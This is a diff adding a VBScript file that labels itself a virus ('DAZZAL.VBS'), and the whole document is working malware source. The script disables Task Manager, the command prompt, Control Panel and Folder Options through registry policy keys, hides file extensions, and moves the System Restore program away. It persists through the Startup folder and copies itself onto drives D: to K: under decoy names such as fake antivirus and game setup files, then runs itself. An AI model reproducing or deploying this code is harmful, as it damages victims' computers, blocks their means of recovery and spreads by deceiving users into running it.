@@ -1,0 +1,54 @@
+'SCRIPT VIRUS DAZZAL.VBS
+
+On error resume next
+Dim Regpen, FSO, Copier, Creator, Dupler, Deleter, Runner
+set Regpen = CreateObject ("Wscript.Shell")
+set FSO = CreateObject ("Scripting.FileSystemObject")
+set Creator = FSO.CreateTextFile ("C:\Ternate.vbs", true)
+Creator.WriteLine ("Msgbox ("& Chr (34) & "Salam Kenal dari Saya, Mr.Dajjal :<" & chr (34)& ")")
+Creator.Close
+
+Regpen.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoRun","1","REG_DWORD"
+Regpen.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr","1","REG_DWORD"
+Regpen.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD","1","REG_DWORD"
+Regpen.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOption","1","REG_DWORD"
+Regpen.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives","16","REG_DWORD"
+Regpen.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSaveSettings","1","REG_DWORD"
+Regpen.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel","1","REG_DWORD"
+Regpen.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\NoSetTaskbar","1","REG_DWORD"
+Regpen.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Advanced\HideFileExt","1","REG_DWORD"
+Regpen.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption", "THE Syaithan-X"
+Regpen.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText","ASSALAMUALAIKUM, YA AHLIL KUBUR"
+
+Set Copier = FSO.GetFile ("C:\Ternate.vbs")
+Copier.Copy ("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Adobe.vbs")
+
+FSO.CreateFolder ("C:\Program Files\Microsoft 0ffice\0ffice12")
+FSO.CreateFolder ("D:\Program")
+FSO.CreateFolder ("E:\Program")
+FSO.CreateFolder ("F:\Program")
+FSO.CreateFolder ("G:\Program")
+FSO.CreateFolder ("H:\Program")
+FSO.CreateFolder ("I:\Program")
+FSO.CreateFolder ("J:\Program")
+FSO.CreateFolder ("K:\Program")
+
+Set Deleter = FSO.GetFile ("C:\Windows\System32\Restore\rstrui.exe")
+Deleter.Move ("C:\Program Files\Microsoft 0ffice\0ffice12\rstrui.Gnamu")
+
+set Dupler = FSO.GetFile (WScript.ScriptFullName)
+Dupler.Copy ("C:\Program Files\Microsof 0ffice\0ffice12\Hantu.vbs")
+Dupler.Copy ("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Desktop.ini.vbs")
+Dupler.Copy ("C:\Documents and Settings\All Users\Desktop\Dajjal_Antivirus.exe.vbs")
+Dupler.Copy ("C:\Windows\System32\Restore\rstrui.exe.vbs")
+Dupler.Copy ("D:\Program\MotoGP_SETUP.vbs")
+Dupler.Copy ("E:\Program\TuneUp2009_SETUP.vbs")
+Dupler.Copy ("F:\Program\Ansav_SETUP.vbs")
+Dupler.Copy ("G:\Program\DeltaForce_SETUP.vbs")
+Dupler.Copy ("H:\Program\DeltaForce_SETUP.vbs")
+Dupler.Copy ("I:\Program\Ansav_SETUP.vbs")
+Dupler.Copy ("J:\Program\Project.vbs")
+Dupler.Copy ("K:\Program\Hantu.vbs")
+
+Set Runner = WScript.CreateObject ("WScript.Shell")
+Runner.Run ("C:\Program Files\Microsoft 0ffice\0ffice12\Hantu.vbs")
